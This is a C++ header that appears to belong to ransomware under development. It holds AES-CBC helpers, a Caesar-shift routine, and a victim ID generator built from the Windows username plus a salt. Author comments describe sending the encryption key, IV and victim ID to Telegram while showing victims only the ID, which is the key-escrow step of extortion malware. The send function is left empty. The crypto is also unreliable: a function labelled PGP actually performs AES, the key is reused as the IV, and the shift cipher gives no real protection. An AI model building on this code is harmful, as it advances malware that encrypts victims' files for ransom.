#pragma once
#include <iostream>
#include <Windows.h>
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
#include <random>
#include "settings.h"

std::string random_string(std::string::size_type length)
{
    static auto& chrs = "0123456789"
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

    thread_local static std::mt19937 rg{ std::random_device{}() };
    thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

    std::string s;

    s.reserve(length);

    while (length--)
        s += chrs[pick(rg)];

    return s;
}

std::string string_to_hex(const std::string& in) {
    std::stringstream ss;

    ss << std::hex << std::setfill('0');
    for (size_t i = 0; in.length() > i; ++i) {
        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
    }

    return ss.str();
}

std::string SecByteBlockToString(const CryptoPP::SecByteBlock& block) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (size_t i = 0; i < block.size(); ++i) {
        oss << std::setw(2) << static_cast<unsigned>(block[i]);
    }
    return oss.str();
}

std::string __pgp(const std::string& key, const std::string& sText) {
    std::string encrypted;

    CryptoPP::AES::Encryption aesEncryption((CryptoPP::byte*)key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, (CryptoPP::byte*)key.c_str());

    CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink(encrypted));
    stfEncryptor.Put(reinterpret_cast<const unsigned char*>(sText.c_str()), sText.length() + 1);
    stfEncryptor.MessageEnd();

    std::string encryptedHex;
    CryptoPP::StringSource(encrypted, true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(encryptedHex)));

    return encryptedHex;
}

std::string __pgp_dec(const std::string& key, const std::string& sEncryptedHex) {
    std::string sEncrypted;
    CryptoPP::StringSource(sEncryptedHex, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(sEncrypted)));

    std::string decrypted;

    CryptoPP::AES::Decryption aesDecryption((CryptoPP::byte*)key.c_str(), CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, (CryptoPP::byte*)key.c_str());

    CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(decrypted));
    stfDecryptor.Put(reinterpret_cast<const unsigned char*>(sEncrypted.c_str()), sEncrypted.size());
    stfDecryptor.MessageEnd();

    return decrypted;
}



std::string __enc(std::string sText) {
    for (char& c : sText) {
        if (std::isalnum(c)) { // Check if character is alphanumeric
            if (std::isalpha(c)) {
                if (std::islower(c)) {
                    if (c != 'a') c = std::tolower(c - 1);
                    else c = 'z';
                }
                else {
                    if (c != 'A') c = std::toupper(c - 1);
                    else c = 'Z';
                }
            }
            else if (std::isdigit(c)) {
                if (c != '0') c -= 1;
                else c = '9';
            }
        }
    }
    return sText;
}

std::string __enc_decrypt(std::string sEncrypted) {
    for (char& c : sEncrypted) {
        if (std::isalnum(c)) { // Check if character is alphanumeric
            if (std::isalpha(c)) {
                if (std::islower(c)) {
                    if (c != 'z') c = std::tolower(c + 1);
                    else c = 'a';
                }
                else {
                    if (c != 'Z') c = std::toupper(c + 1);
                    else c = 'A';
                }
            }
            else if (std::isdigit(c)) {
                if (c != '9') c += 1;
                else c = '0';
            }
        }
    }
    return sEncrypted;
}


// change of plan, ima send key + iv + user unique id to telegram and only showw them there unique id not the other shit encrypted. however ima send the key + iv encrypted to telegram (pgp)

std::string __gen_unique_id(const CryptoPP::SecByteBlock key, const CryptoPP::SecByteBlock __iv)
{
    char* user;
    size_t len;
    errno_t err = _dupenv_s(&user, &len, "USERNAME"); // get username

    std::string usernam_str = std::string(user);
    std::string usernam_str_salted = usernam_str + random_string(16);// gonna salt it by adding a random string
    std::string sUniqueId = string_to_hex(usernam_str_salted); // make it hex (salted username to hex)

    // current format -> 736b61725068536b4b6467337659374f6d484f71
    // now ima add the IV and Key to it (encrypted obv but yh) -> format: sUniqueId_iv_key
    
    ////encryt iv
    //std::string __iv_string = SecByteBlockToString(__iv); //making it a string
    //std::string  __iv_string_enc = __enc(__iv_string);
    //std::cout << " [ __iv_string ] -> " << __iv_string << std::endl;
    //std::cout << " [ __iv_string_enc ] -> " << __iv_string_enc << std::endl;
    //std::cout << " [ __iv_string_de_enc ] -> " << __enc_decrypt(__iv_string_enc) << std::endl;

    // //encrpyt key
    //std::string __key_string = SecByteBlockToString(key); //making it a string
    //std::string  __key_string_enc = __enc(__key_string);
    //std::cout << "\n [ __key_string ] -> " << __key_string << std::endl;
    //std::cout << " [ __key_string_enc ] -> " << __key_string_enc << std::endl;
    //std::cout << " [ __key_string_de_enc ] -> " << __enc_decrypt(__key_string_enc) << std::endl;

    //// add iv and key to sUniqueId
    //std::string sUniqueIdWithInfo =  __iv_string_enc + "_" + __key_string_enc;

    return sUniqueId; // i cant make up my mind on how i should name my vars :sob:
}

std::string __send_key(const CryptoPP::SecByteBlock key, const CryptoPP::SecByteBlock __iv)
{

}